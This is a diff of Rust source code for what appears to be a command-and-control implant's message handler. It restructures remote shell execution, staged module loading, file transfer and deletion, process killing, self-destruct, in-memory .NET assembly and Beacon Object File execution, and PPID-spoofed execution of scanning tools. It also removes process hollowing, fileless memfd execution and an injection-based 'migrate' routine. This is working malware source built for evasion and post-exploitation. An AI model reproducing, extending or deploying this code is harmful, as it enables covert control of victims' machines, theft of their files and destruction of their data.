@@ -7,15 +7,111 @@
 // 不依赖任何具体的传输协议实现。
 
 use crate::error::{ClientError, Result};
+#[cfg(feature = "post-ex")]
 use crate::executor::CommandExecutor;
 use crate::transport::Transport;
 use crate::types::{CommandPayload, CommandResult, MessageType, MessageWrapper, SystemInfo};
 use log::{debug, error, info, warn};
 use futures_util::future::{BoxFuture, FutureExt};
-#[cfg(target_os = "windows")]
-use encoding_rs::GBK;
 use base64::Engine;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
+
+/// Stage0: command needs L2 module not yet loaded.
+#[cfg(all(feature = "module-loader", not(feature = "post-ex")))]
+fn stage0_module_required(command_type: &str) -> CommandResult {
+    let msg = match crate::module_loader::ensure_module_for_command(command_type) {
+        Err(e) => e,
+        Ok(()) => format!("module_required:{} (loaded but no handler path)", command_type),
+    };
+    CommandResult {
+        stdout: String::new(),
+        stderr: msg,
+        path: None,
+        req_id: None,
+    }
+}
+
+/// Stage0: run shell via loaded mod_shell (or report module_required).
+#[cfg(all(feature = "module-loader", not(feature = "post-ex")))]
+fn stage0_shell(command: &str) -> CommandResult {
+    match crate::module_loader::invoke_shell(command) {
+        Ok(r) => r,
+        Err(e) => CommandResult {
+            stdout: String::new(),
+            stderr: e,
+            path: None,
+            req_id: None,
+        },
+    }
+}
+
+/// Stage0: stage+load CKMS module package (base64 in data, id in path or content).
+#[cfg(feature = "module-loader")]
+fn stage0_module_stage(payload: &crate::types::CommandPayload) -> CommandResult {
+    let id = payload
+        .path
+        .as_deref()
+        .filter(|s| !s.is_empty())
+        .unwrap_or_else(|| {
+            let c = payload.command_content.trim();
+            if c.is_empty() {
+                "shell"
+            } else {
+                c
+            }
+        });
+    let raw = payload.data.as_deref().unwrap_or("").trim();
+    if raw.is_empty() {
+        return CommandResult {
+            stdout: String::new(),
+            stderr: "module_stage: missing data (base64 CKMS blob)".into(),
+            path: None,
+            req_id: None,
+        };
+    }
+    match crate::module_loader::handle_module_stage(id, raw.as_bytes(), true) {
+        Ok(msg) => CommandResult {
+            stdout: msg,
+            stderr: String::new(),
+            path: None,
+            req_id: None,
+        },
+        Err(e) => CommandResult {
+            stdout: String::new(),
+            stderr: e,
+            path: None,
+            req_id: None,
+        },
+    }
+}
+
+/// Stage0: unload module by id.
+#[cfg(feature = "module-loader")]
+fn stage0_module_unload(payload: &crate::types::CommandPayload) -> CommandResult {
+    let id = payload.command_content.trim();
+    if id.is_empty() {
+        return CommandResult {
+            stdout: String::new(),
+            stderr: "module_unload: missing id".into(),
+            path: None,
+            req_id: None,
+        };
+    }
+    match crate::module_loader::registry().unload(id) {
+        Ok(()) => CommandResult {
+            stdout: format!("unloaded {id}"),
+            stderr: String::new(),
+            path: None,
+            req_id: None,
+        },
+        Err(e) => CommandResult {
+            stdout: String::new(),
+            stderr: e,
+            path: None,
+            req_id: None,
+        },
+    }
+}
 
 /// 消息处理器
 /// 
@@ -258,24 +354,105 @@ impl MessageHandler {
         // 根据命令类型执行不同的操作
         let mut result = match command_payload.command_type.as_str() {
             "shell" => {
-                // 执行 shell 命令
                 let clean_cmd = command_payload.command_content.trim();
-                
                 if clean_cmd.is_empty() || clean_cmd.starts_with('{') {
                     debug!("Silently dropping heartbeat/control message: {}", command_payload.command_content);
                     return Ok(());
                 }
-                
-                CommandExecutor::execute(clean_cmd).await
+                #[cfg(feature = "post-ex")]
+                {
+                    CommandExecutor::execute(clean_cmd).await
+                }
+                #[cfg(all(feature = "module-loader", not(feature = "post-ex")))]
+                {
+                    stage0_shell(clean_cmd)
+                }
+                #[cfg(all(not(feature = "post-ex"), not(feature = "module-loader")))]
+                {
+                    let _ = clean_cmd;
+                    CommandResult {
+                        stdout: String::new(),
+                        stderr: "shell unavailable (no post-ex / module-loader)".into(),
+                        path: None,
+                        req_id: None,
+                    }
+                }
             }
+            // L2 module management (Stage0 + legacy with module-loader)
+            #[cfg(feature = "module-loader")]
+            "module_stage" | "module_push" | "module_load" => {
+                stage0_module_stage(&command_payload)
+            }
+            #[cfg(feature = "module-loader")]
+            "module_unload" => stage0_module_unload(&command_payload),
+            #[cfg(feature = "module-loader")]
+            "module_list" => {
+                let list = crate::module_loader::registry().list_loaded();
+                CommandResult {
+                    stdout: list.join(","),
+                    stderr: String::new(),
+                    path: None,
+                    req_id: None,
+                }
+            },
             "shell_interactive" => {
-                // 启动交互式 shell 会话
-                self.start_interactive_shell(req_id.clone()).await
+                // Legacy monolith: interactive session (may still use hybrid/PTY elsewhere).
+                // Stage0/beacon: NEVER spawn cmd.exe/bash here — require mod_shell.
+                #[cfg(feature = "post-ex")]
+                {
+                    self.start_interactive_shell(req_id.clone()).await
+                }
+                #[cfg(all(feature = "module-loader", not(feature = "post-ex")))]
+                {
+                    let _ = req_id;
+                    // Fail closed: no cmd.exe/bash in Stage0. Absent → module_required:shell.
+                    // Loaded → one-shot shell path only (interactive stream stays L2/post-ex).
+                    match crate::module_loader::ensure_module_for_command("shell_interactive") {
+                        Err(e) => CommandResult {
+                            stdout: String::new(),
+                            stderr: e,
+                            path: None,
+                            req_id: None,
+                        },
+                        Ok(()) => CommandResult {
+                            stdout: String::new(),
+                            stderr: "shell_interactive not on Stage0; use command_type=shell via mod_shell"
+                                .into(),
+                            path: None,
+                            req_id: None,
+                        },
+                    }
+                }
+                #[cfg(all(not(feature = "post-ex"), not(feature = "module-loader")))]
+                {
+                    let _ = req_id;
+                    CommandResult {
+                        stdout: String::new(),
+                        stderr: "shell_interactive unavailable (no post-ex / module-loader)".into(),
+                        path: None,
+                        req_id: None,
+                    }
+                }
             }
 
 
+            // --- File commands: post-ex only ---
+            #[cfg(all(feature = "module-loader", not(feature = "post-ex")))]
+            "file_ls" | "file_upload" | "file_upload_chunk" | "file_download"
+            | "file_download_chunk" | "file_delete" | "file_mkdir" => {
+                stage0_module_required("file_list")
+            }
+            #[cfg(all(not(feature = "post-ex"), not(feature = "module-loader")))]
+            "file_ls" | "file_upload" | "file_upload_chunk" | "file_download"
+            | "file_download_chunk" | "file_delete" | "file_mkdir" => CommandResult {
+                stdout: String::new(),
+                stderr: "file ops unavailable".into(),
+                path: None,
+                req_id: None,
+            },
+
+            #[cfg(feature = "post-ex")]
             "file_ls" => {
-                // 列出目录文件
                 let target_path = command_payload
                     .path
                     .as_deref()
@@ -296,8 +473,8 @@ impl MessageHandler {
                     },
                 }
             }
+            #[cfg(feature = "post-ex")]
             "file_upload" => {
-                // 上传文件
                 if let (Some(path), Some(data)) = (command_payload.path.as_deref(), command_payload.data.as_deref()) {
                     if path.trim().is_empty() || data.trim().is_empty() {
                         CommandResult {
@@ -331,8 +508,8 @@ impl MessageHandler {
                     }
                 }
             }
+            #[cfg(feature = "post-ex")]
             "file_upload_chunk" => {
-                // 分块上传文件
                 if let (Some(path), Some(data)) = (command_payload.path.as_deref(), command_payload.data.as_deref()) {
                     let is_append = serde_json::from_str::<serde_json::Value>(&command_payload.command_content)
                         .ok()
@@ -361,8 +538,8 @@ impl MessageHandler {
                     }
                 }
             }
+            #[cfg(feature = "post-ex")]
             "file_download" => {
-                // 下载文件
                 let target_path = command_payload
                     .path
                     .as_deref()
@@ -382,8 +559,8 @@ impl MessageHandler {
                     },
                 }
             }
+            #[cfg(feature = "post-ex")]
             "file_download_chunk" => {
-                // 分块下载文件
                 let target_path = command_payload.path.as_deref()
                     .unwrap_or_else(|| {
                         let parts: Vec<&str> = command_payload.command_content.split('|').collect();
@@ -391,9 +568,8 @@ impl MessageHandler {
                     });
                 
                 let mut offset = 0u64;
-                let mut size = 2 * 1024 * 1024; // 2MB default
+                let mut size = 2 * 1024 * 1024;
                 
-                // Allow parsing from JSON
                 if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&command_payload.command_content) {
                     offset = parsed.get("offset").and_then(|v| v.as_u64()).unwrap_or(0);
                     size = parsed.get("size").and_then(|v| v.as_u64()).unwrap_or(2 * 1024 * 1024) as usize;
@@ -421,8 +597,8 @@ impl MessageHandler {
                     }
                 }
             }
+            #[cfg(feature = "post-ex")]
             "file_delete" => {
-                // 删除文件/目录 (支持批量)
                 if let Ok(paths) = serde_json::from_str::<Vec<String>>(&command_payload.command_content) {
                     let mut results = Vec::new();
                     let mut errors = Vec::new();
@@ -468,72 +644,68 @@ impl MessageHandler {
                     }
                 }
             }
-            "process_list" => {
-                // 列出系统进程
-                Self::process_list().await
-            }
+            #[cfg(feature = "post-ex")]
+            "process_list" => Self::process_list().await,
+            #[cfg(feature = "post-ex")]
             "process_kill" => {
-                // 终止进程
                 let pid = command_payload.command_content.trim();
                 Self::process_kill(pid).await
             }
+            #[cfg(all(feature = "module-loader", not(feature = "post-ex")))]
+            "process_list" | "process_kill" => stage0_module_required("process_list"),
+            #[cfg(all(not(feature = "post-ex"), not(feature = "module-loader")))]
+            "process_list" | "process_kill" => CommandResult {
+                stdout: String::new(),
+                stderr: "process ops unavailable".into(),
+                path: None,
+                req_id: None,
+            },
 
-            "hollow_shellcode" => {
-                // 🚨 SECURITY OPERATION: Process Hollowing - Route through plugin router
-                
-                match crate::plugin_router::PluginRouter::parse_plugin_task("hollow-shellcode", &command_payload.command_content, command_payload.req_id.clone()) {
-                    Ok(task) => {
-                        crate::plugin_router::PluginRouter::execute_plugin(task).await
-                    }
-                    Err(e) => CommandResult {
-                        stdout: String::new(),
-                        stderr: e,
-                        path: None,
-                        req_id: None,
-                    }
-                }
-            }
             "self_destruct" => {
-                // 🚨 SELF-DESTRUCT: Delete agent and exit - Route through plugin router
-                
-                let task = crate::plugin_router::PluginTask {
-                    execution_type: "self-destruct".to_string(),
-                    data: vec![],
-                    args: vec![],
-                    metadata: None,
-                    task_id: format!("self_destruct_{:08x}", crate::utils::next_u32()),
-                    req_id: command_payload.req_id.clone(),
-                    plugin_id: None,
-                };
-                
-                crate::plugin_router::PluginRouter::execute_plugin(task).await
+                crate::utils::self_destruct().await
             }
-            "run_memfd_elf" => {
-                // 🚨 FILELESS EXECUTION: Run ELF from memory (Linux only) - Route through plugin router
-                
-                match crate::plugin_router::PluginRouter::parse_plugin_task("memfd-exec", &command_payload.command_content, command_payload.req_id.clone()) {
-                    Ok(task) => {
-                        crate::plugin_router::PluginRouter::execute_plugin(task).await
+            // PPID-isolated .NET host when isolated-exec is on
+            #[cfg(feature = "isolated-exec")]
+            "execute_assembly" => {
+                let assembly = command_payload
+                    .data
+                    .as_deref()
+                    .and_then(|d| base64::engine::general_purpose::STANDARD.decode(d.trim()).ok());
+                match assembly {
+                    Some(bytes) => {
+                        let args: Vec<String> = command_payload
+                            .command_content
+                            .split_whitespace()
+                            .map(|s| s.to_string())
+                            .collect();
+                        let mut r =
+                            crate::isolated_exec::run_dotnet_isolated(&bytes, &args).await;
+                        r.req_id = command_payload.req_id.clone();
+                        r
                     }
-                    Err(e) => CommandResult {
+                    None => CommandResult {
                         stdout: String::new(),
-                        stderr: e,
+                        stderr: "execute_assembly: missing base64 data (stage iso_host if missing)"
+                            .into(),
                         path: None,
-                        req_id: None,
-                    }
+                        req_id: command_payload.req_id.clone(),
+                    },
                 }
             }
+            // In-process .NET when isolated-exec off
+            #[cfg(all(feature = "plugin", feature = "dotnet", not(feature = "isolated-exec")))]
             "execute_assembly" => {
-                // 🚨 .NET ASSEMBLY EXECUTION: Execute C# assembly from memory (Windows only) - Route through plugin router
-                
-                // Prioritize binary data from the Data field
                 let assembly_data = if let Some(d) = command_payload.data.as_deref() {
-                     base64::engine::general_purpose::STANDARD.decode(d.trim()).ok()
+                    base64::engine::general_purpose::STANDARD.decode(d.trim()).ok()
                 } else {
                     None
                 };
 
-                match crate::plugin_router::PluginRouter::parse_plugin_task("execute-assembly", &command_payload.command_content, command_payload.req_id.clone()) {
+                match crate::plugin_router::PluginRouter::parse_plugin_task(
+                    "execute-assembly",
+                    &command_payload.command_content,
+                    command_payload.req_id.clone(),
+                ) {
                     Ok(mut task) => {
                         if let Some(data) = assembly_data {
                             task.data = data;
@@ -545,15 +717,14 @@ impl MessageHandler {
                         stderr: e,
                         path: None,
                         req_id: None,
-                    }
+                    },
                 }
             }
-
+            #[cfg(feature = "plugin")]
             "plugin_cache" => {
-                // 📦 PLUGIN CACHING: Store plugin binary in memory
                 let plugin_id = command_payload.command_content.trim().to_string();
                 let b64_data = command_payload.data.as_deref().unwrap_or("");
-                
+
                 if plugin_id.is_empty() || b64_data.is_empty() {
                     CommandResult {
                         stdout: String::new(),
@@ -577,43 +748,101 @@ impl MessageHandler {
                             stderr: format!("Failed to decode plugin data: {}", e),
                             path: None,
                             req_id: command_payload.req_id.clone(),
-                        }
+                        },
                     }
                 }
             }
 
+            // Native PE tools (fscan etc.) — PPID-spoofed short process, not shell spawn
+            #[cfg(feature = "isolated-exec")]
+            "native_exec" => {
+                let args = command_payload.command_content.trim();
+                let pe = command_payload
+                    .data
+                    .as_deref()
+                    .and_then(|d| base64::engine::general_purpose::STANDARD.decode(d.trim()).ok());
+                match pe {
+                    Some(bytes) => {
+                        let mut r =
+                            crate::isolated_exec::run_native_isolated(&bytes, args).await;
+                        r.req_id = command_payload.req_id.clone();
+                        r
+                    }
+                    None => CommandResult {
+                        stdout: String::new(),
+                        stderr: "native_exec: missing base64 PE data".into(),
+                        path: None,
+                        req_id: command_payload.req_id.clone(),
+                    },
+                }
+            }
+            // PPID-isolated sacrificial host (preferred when isolated-exec is on)
+            #[cfg(feature = "isolated-exec")]
             "bof_exec" => {
-                // 🚨 BEACON OBJECT FILE (BOF) EXECUTION: Run BOF from memory
+                let content = command_payload.command_content.trim();
+                let bof_b64 = command_payload.data.as_deref().unwrap_or("");
+                match base64::engine::general_purpose::STANDARD.decode(bof_b64.trim()) {
+                    Ok(bytes) => {
+                        let arg_bytes = base64::engine::general_purpose::STANDARD
+                            .decode(content)
+                            .unwrap_or_default();
+                        let mut r =
+                            crate::isolated_exec::run_bof_isolated(&bytes, &arg_bytes).await;
+                        r.req_id = command_payload.req_id.clone();
+                        r
+                    }
+                    Err(_) => CommandResult {
+                        stdout: String::new(),
+                        stderr: "bof_exec: bad base64 (stage iso_host PE if missing)".into(),
+                        path: None,
+                        req_id: command_payload.req_id.clone(),
+                    },
+                }
+            }
+            // In-process BOF only when isolated-exec is off
+            #[cfg(all(feature = "bof", not(feature = "isolated-exec")))]
+            "bof_exec" => {
                 let content = command_payload.command_content.trim();
                 let bof_bytes = if content.starts_with("cached:") {
-                    let id = &content[7..];
-                    crate::plugin_router::PluginRouter::get_cached_plugin(id)
+                    let id = content[7..].split('|').next().unwrap_or("");
+                    #[cfg(feature = "plugin")]
+                    {
+                        crate::plugin_router::PluginRouter::get_cached_plugin(id)
+                    }
+                    #[cfg(not(feature = "plugin"))]
+                    {
+                        let _ = id;
+                        None
+                    }
                 } else {
                     let bof_b64 = command_payload.data.as_deref().unwrap_or("");
-                    base64::engine::general_purpose::STANDARD.decode(bof_b64.trim()).ok()
+                    base64::engine::general_purpose::STANDARD
+                        .decode(bof_b64.trim())
+                        .ok()
                 };
 
                 match bof_bytes {
                     Some(bytes) => {
-                        // For BOF, the arguments are in CommandContent if not using cached:
-                        // If using cached:, we might need a different way to pass args, 
-                        // but let's assume for now args are handled or empty.
-                        // Actually, let's refine this: cached:ID|args_b64
                         let (final_bytes, arg_bytes) = if content.starts_with("cached:") {
-                           let parts: Vec<&str> = content[7..].splitn(2, '|').collect();
-                           let args = if parts.len() > 1 { 
-                               base64::engine::general_purpose::STANDARD.decode(parts[1]).unwrap_or_default() 
-                           } else { 
-                               vec![] 
-                           };
-                           (bytes, args)
+                            let parts: Vec<&str> = content[7..].splitn(2, '|').collect();
+                            let args = if parts.len() > 1 {
+                                base64::engine::general_purpose::STANDARD
+                                    .decode(parts[1])
+                                    .unwrap_or_default()
+                            } else {
+                                vec![]
+                            };
+                            (bytes, args)
                         } else {
-                           let args = base64::engine::general_purpose::STANDARD.decode(content).unwrap_or_default();
-                           (bytes, args)
+                            let args = base64::engine::general_purpose::STANDARD
+                                .decode(content)
+                                .unwrap_or_default();
+                            (bytes, args)
                         };
 
-                        #[cfg(target_os = "windows")]
-                        match crate::loader::bof::BofLoader::execute(&final_bytes, &arg_bytes).await {
+                        #[cfg(all(feature = "bof", target_os = "windows"))]
+                        match crate::loader::bof::BofLoader::execute(&final_bytes, &arg_bytes).await
+                        {
                             Ok(output) => CommandResult {
                                 stdout: output,
                                 stderr: String::new(),
@@ -627,86 +856,27 @@ impl MessageHandler {
                                 req_id: command_payload.req_id.clone(),
                             },
                         }
-                        #[cfg(not(target_os = "windows"))]
-                        CommandResult {
-                            stdout: String::new(),
-                            stderr: "BOF execution is only supported on Windows".to_string(),
-                            path: None,
-                            req_id: command_payload.req_id.clone(),
+                        #[cfg(not(all(feature = "bof", target_os = "windows")))]
+                        {
+                            let _ = (final_bytes, arg_bytes);
+                            CommandResult {
+                                stdout: String::new(),
+                                stderr: "BOF execution is only supported on Windows".to_string(),
+                                path: None,
+                                req_id: command_payload.req_id.clone(),
+                            }
                         }
                     }
                     None => CommandResult {
                         stdout: String::new(),
-                        stderr: "Failed to obtain BOF data (not in cache and no data provided)".to_string(),
+                        stderr: "Failed to obtain BOF data (not in cache and no data provided)"
+                            .to_string(),
                         path: None,
                         req_id: command_payload.req_id.clone(),
                     },
                 }
             }
-            "migrate" => {
-                // 🚀 ADVANCED MIGRATION (Loader V2 - Section Mapping / File Sealing)
-                info!("[*] Initiating advanced migration session...");
-                // 1. Resolve Target and Payload
-                let target_str = command_payload.command_content.trim();
-                let payload_b64 = command_payload.data.as_deref().unwrap_or("");
-                
-                let payload = match base64::engine::general_purpose::STANDARD.decode(payload_b64.trim()) {
-                    Ok(data) => data,
-                    Err(e) => {
-                        let res = CommandResult { stdout: String::new(), stderr: format!("Invalid payload: {}", e), path: None, req_id: command_payload.req_id.clone() };
-                        return self.send_message(&res.to_response_message()).await;
-                    }
-                };
 
-                // 2. JIT Decryption (Only if not already a plain PE)
-                let data = if payload.len() > 2 && &payload[0..2] == b"MZ" {
-                    debug!("[Cupcake] Payload has MZ header, skipping decryption.");
-                    payload
-                } else {
-                    let key = crate::config::get_aes_key();
-                    match crate::crypto::decrypt(&payload, &key) {
-                        Ok(decrypted) => {
-                            debug!("[Cupcake] Migration payload decrypted successfully.");
-                            decrypted
-                        },
-                        Err(_) => {
-                            warn!("[!] Decryption failed, using raw payload.");
-                            payload
-                        },
-                    }
-                };
-
-                let target_name = if target_str.is_empty() { None } else { Some(target_str) };
-
-                // 4. Load via V2 Architecture
-                let loader = crate::loader::get_loader();
-                let status = loader.load(data, target_name, None).await;
-
-                match status {
-                    crate::loader::MigrationStatus::Success => {
-                        info!("Migration successful, triggering self-destruct...");
-                        let success_res = CommandResult {
-                            stdout: format!("[+] Migration successful to: {}", target_str),
-                            stderr: String::new(),
-                            path: None,
-                            req_id: command_payload.req_id.clone(),
-                        };
-                        // Send success message first
-                        let _ = self.send_message(&success_res.to_response_message()).await;
-                        // Brief wait to ensure message delivery
-                        tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
-                        // Then self destruct
-                        let _ = crate::injection::ProcessInjector::self_destruct().await;
-                        return Ok(()); // Handled manually
-                    },
-                    _ => CommandResult {
-                        stdout: String::new(),
-                        stderr: format!("Migration failed: {:?}", status),
-                        path: None,
-                        req_id: command_payload.req_id.clone(),
-                    }
-                }
-            }
             _ => {
                 warn!(
                     "Unsupported command type: {}, ignoring",
@@ -729,46 +899,33 @@ impl MessageHandler {
         }.boxed()
     }
     
-    /// 列出系统进程
-    /// 
-    /// Windows: 使用 tasklist /FO CSV /NH
-    /// Linux: 使用 ps -e -o pid,user,comm --no-headers
-    /// 
-    /// 返回 JSON 数组格式的进程列表
-    /// 列出系统进程
-    /// 
-    /// 使用 sysinfo 库获取跨平台进程列表
-    /// 列出系统进程 (原生高性能版)
+    /// 列出系统进程 (Windows: NtQuerySystemInformation / Linux: /proc)
+    #[cfg(feature = "post-ex")]
     async fn process_list() -> CommandResult {
         let mut processes = Vec::new();
 
         #[cfg(target_os = "windows")]
         {
-            use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32FirstW, Process32NextW, TH32CS_SNAPPROCESS};
-            use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
-            use winapi::shared::minwindef::TRUE;
-
-            unsafe {
-                let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-                if snapshot != INVALID_HANDLE_VALUE {
-                    let mut entry: PROCESSENTRY32W = std::mem::zeroed();
-                    entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
-
-                    if Process32FirstW(snapshot, &mut entry) == TRUE {
-                        loop {
-                            let name = String::from_utf16_lossy(&entry.szExeFile).trim_matches('\0').to_string();
-                            processes.push(serde_json::json!({
-                                "pid": entry.th32ProcessID,
-                                "ppid": entry.th32ParentProcessID,
-                                "name": name,
-                                "user": "",
-                                "path": "",
-                                "arch": "x64",
-                            }));
-                            if Process32NextW(snapshot, &mut entry) != TRUE { break; }
-                        }
+            match crate::native::list_processes() {
+                Ok(list) => {
+                    for p in list {
+                        processes.push(serde_json::json!({
+                            "pid": p.pid,
+                            "ppid": p.ppid,
+                            "name": p.name,
+                            "user": "",
+                            "path": "",
+                            "arch": "x64",
+                        }));
                     }
-                    CloseHandle(snapshot);
+                }
+                Err(e) => {
+                    return CommandResult {
+                        stdout: "[]".to_string(),
+                        stderr: e,
+                        path: None,
+                        req_id: None,
+                    };
                 }
             }
         }
@@ -801,14 +958,15 @@ impl MessageHandler {
                 }
             }
         }
-        
+
         match serde_json::to_string(&processes) {
             Ok(json) => CommandResult { stdout: json, stderr: String::new(), path: None, req_id: None },
             Err(e) => CommandResult { stdout: "[]".to_string(), stderr: e.to_string(), path: None, req_id: None },
         }
     }
-    
-    /// 终止指定进程 (原生版)
+
+    /// 终止指定进程 (Windows: NtOpenProcess + NtTerminateProcess)
+    #[cfg(feature = "post-ex")]
     async fn process_kill(pid_str: &str) -> CommandResult {
         let pid_u32 = match pid_str.parse::<u32>() {
             Ok(p) => p,
@@ -817,31 +975,39 @@ impl MessageHandler {
 
         #[cfg(target_os = "windows")]
         {
-            use winapi::um::processthreadsapi::{OpenProcess, TerminateProcess};
-            use winapi::um::winnt::PROCESS_TERMINATE;
-            use winapi::um::handleapi::CloseHandle;
-            use winapi::shared::minwindef::FALSE;
-
-            unsafe {
-                let h = OpenProcess(PROCESS_TERMINATE, FALSE, pid_u32);
-                if !h.is_null() {
-                    let res = TerminateProcess(h, 1);
-                    CloseHandle(h);
-                    if res != FALSE {
-                        return CommandResult { stdout: format!("Killed PID {}", pid_u32), stderr: String::new(), path: None, req_id: None };
-                    }
-                }
-            }
+            return match crate::native::terminate_process(pid_u32) {
+                Ok(()) => CommandResult {
+                    stdout: format!("Killed PID {}", pid_u32),
+                    stderr: String::new(),
+                    path: None,
+                    req_id: None,
+                },
+                Err(e) => CommandResult {
+                    stdout: String::new(),
+                    stderr: e,
+                    path: None,
+                    req_id: None,
+                },
+            };
         }
 
         #[cfg(not(target_os = "windows"))]
         {
             if unsafe { libc::kill(pid_u32 as i32, 9) } == 0 {
-                return CommandResult { stdout: format!("Killed PID {}", pid_u32), stderr: String::new(), path: None, req_id: None };
+                return CommandResult {
+                    stdout: format!("Killed PID {}", pid_u32),
+                    stderr: String::new(),
+                    path: None,
+                    req_id: None,
+                };
+            }
+            CommandResult {
+                stdout: String::new(),
+                stderr: "Failed to kill process".to_string(),
+                path: None,
+                req_id: None,
             }
         }
-
-        CommandResult { stdout: String::new(), stderr: "Failed to kill process".to_string(), path: None, req_id: None }
     }
     
     /// 发送消息到服务端
@@ -865,15 +1031,22 @@ impl MessageHandler {
         if let Ok(text) = std::str::from_utf8(bytes) {
             return text.to_string();
         }
-        let (decoded_cow, _encoding_used, _had_errors) = GBK.decode(bytes);
-        decoded_cow.to_string()
+        #[cfg(feature = "encoding-support")]
+        {
+            let (decoded_cow, _encoding_used, _had_errors) = encoding_rs::GBK.decode(bytes);
+            return decoded_cow.to_string();
+        }
+        #[cfg(not(feature = "encoding-support"))]
+        {
+            String::from_utf8_lossy(bytes).into_owned()
+        }
     }
     
-    /// 启动交互式 shell 会话
-    /// 
-    /// 实现 WebSocket 到 shell 的实时通信，过滤掉心跳和控制消息。
-    /// 修复了 "The filename, directory name, or volume label syntax is incorrect" 错误。
-    /// 使用 encoding_rs 正确处理中文字符编码。
+    /// 启动交互式 shell 会话（仅 post-ex / legacy monolith）。
+    ///
+    /// Stage0 (`beacon`) 不得编译此路径：禁止在 L1 内直接 spawn cmd.exe / bash。
+    /// Stage0 交互作业通过 `mod_shell` 的 one-shot `shell` 命令完成。
+    #[cfg(feature = "post-ex")]
     fn start_interactive_shell<'a>(&'a mut self, req_id: Option<String>) -> BoxFuture<'a, CommandResult> {
         async move {
         info!("Starting interactive shell session");
